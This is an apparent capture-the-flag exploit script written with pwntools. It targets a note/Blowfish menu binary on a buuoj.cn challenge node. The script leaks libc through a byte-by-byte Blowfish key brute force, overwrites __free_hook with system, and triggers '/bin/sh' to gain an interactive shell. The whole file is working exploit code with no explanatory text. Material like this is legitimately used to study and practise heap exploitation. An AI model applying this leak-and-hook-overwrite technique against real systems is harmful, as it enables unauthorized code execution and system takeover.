from pwn import*
from LD import*
from Crypto.Cipher import Blowfish
def new(index,size):
	p.sendlineafter('Choice:','1')
	p.sendlineafter('Input the id:',str(index))
	p.sendlineafter('Input the length:',str(size))
	p.sendafter('Input note price:','/bin/sh\x00')
def free(index):
	p.sendlineafter('Choice:','2')
	p.sendlineafter('Input the id:',str(index))
def enc(message):
	p.sendlineafter('Choice:\n','5')
	p.sendafter('Please input the message:\n',message)
	res = p.recvline()
	return res.strip()
def dec(message):
	p.sendlineafter('Choice:\n','6')
	p.sendafter('Please input the message:\n',message)
def guess_key(target,key):
	for i in range(0x100):
		tmp = chr(i) + key
		tmp = tmp.ljust(8,'\x00')
		c = Blowfish.new(tmp, Blowfish.MODE_ECB)
		test = c.encrypt('SSSSYYMF')
		if target == test:
			return chr(i)+key
def leak():
	key = ""
	for i in range(6):
		var = 0x0E39 + ((0x3D-i)<<24)
		ret=enc(p32(0x867D33FB) + p32(var))
		dec(ret.zfill(16).decode('hex')[::-1])
		target=enc('FMYYSSSS').zfill(16)
		key = guess_key(target.decode('hex'),key)
	return key
def modify(target,key):
	for i in range(8):
		tmp = p32(0x867D33FB) + chr(0xB0-i) + chr(0x0E) + chr(0) + target[i]
		c = Blowfish.new(key, Blowfish.MODE_ECB)
		enc_data = c.encrypt(tmp[::-1])
		dec(enc_data[::-1])
libc = ELF('./libc-2.23.so',checksec=False)
LD=change_ld('./main','./ld-2.23.so')
p = LD.process(env={'LD_PRELOAD':'./libc-2.23.so'})
#context.log_level ='DEBUG'
p = remote('node3.buuoj.cn',27397)
new(0,0x100)
new(1,0x30)
free(0)
key = leak().ljust(8,'\x00')
libc_base = u64(key) - libc.sym['__malloc_hook'] - 0x10 - 88 - 0x100
log.info('LIBC:\t' + hex(libc_base))
system =libc_base + libc.sym['system']
target = p64(libc_base + libc.sym['__free_hook'])[::-1]
modify(target,key)
dec_system = (Blowfish.new(key,Blowfish.MODE_ECB)).decrypt(p64(system)[::-1])
enc(dec_system[::-1])
free(1)
p.interactive()
